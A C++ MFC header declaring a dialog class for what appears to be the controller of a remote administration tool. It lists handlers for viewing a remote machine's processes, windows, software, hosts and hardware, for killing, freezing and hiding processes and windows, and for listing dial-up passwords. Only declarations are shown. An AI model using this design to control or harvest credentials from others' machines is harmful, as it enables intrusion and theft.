#if !defined(AFX_SYSTEMDLG_H__B3DC6DF0_B7D6_4A5C_A893_3FA319C240E8__INCLUDED_)
#define AFX_SYSTEMDLG_H__B3DC6DF0_B7D6_4A5C_A893_3FA319C240E8__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// SystemDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog

class CSystemDlg : public CDialog
{
// Construction
public:
	CSystemDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	void OnReceiveComplete();
	CImageList *m_ImageList;
	static void SetClipboardText(CString &Data);
// Dialog Data
	//{{AFX_DATA(CSystemDlg)
	enum { IDD = IDD_SYSTEM };
	CTabCtrl	m_Tab;
	CListCtrl	m_List;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CSystemDlg)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:
	DWORD dwPrs;
	
	HICON m_hIcon;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString IPAddress;
private:
	CImageList     m_ImgList;
	// Generated message map functions
	//{{AFX_MSG(CSystemDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRclickList(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnRefreshpslist();
	afx_msg void OnSystemCopy();
	afx_msg void OnSystemKillanddel();
	afx_msg void OnSystemKillprocess();
	afx_msg void KillprocessDel(BYTE Buffer ,char *strbuf);
	afx_msg void OnFreezing();
	afx_msg void OnThaw();
	afx_msg void OnFileattr();
	afx_msg void OnBaidu();
	afx_msg void OnWorld();
	afx_msg void OnSystemWindowReturn();
	afx_msg void OnSystemWindowHide();
	afx_msg void OnSystemWindowClost();
	afx_msg void OnSystemWindowMax();
	afx_msg void OnSystemWindowMin();
	afx_msg void OnSystemUninstall();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
	BOOL m_bOnClose;

	void AdjustList();	
	void DeleteList();
	void ShowSelectWindow();

	void ShowProcessList();
	void GetProcessList();

	void ShowWindowsList();
	void GetWindowsList();

	void ShowFileAttr();//显示文件属性

	void ShowDialupassList();
	void GetDialupassList();

	void ShowSoftWareList();
	void GetSoftWareList();

	void ShowHostsList();
	void GetHostsList();

	void ShowHardwareList();
	void GetHardwareList();
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_SYSTEMDLG_H__B3DC6DF0_B7D6_4A5C_A893_3FA319C240E8__INCLUDED_)
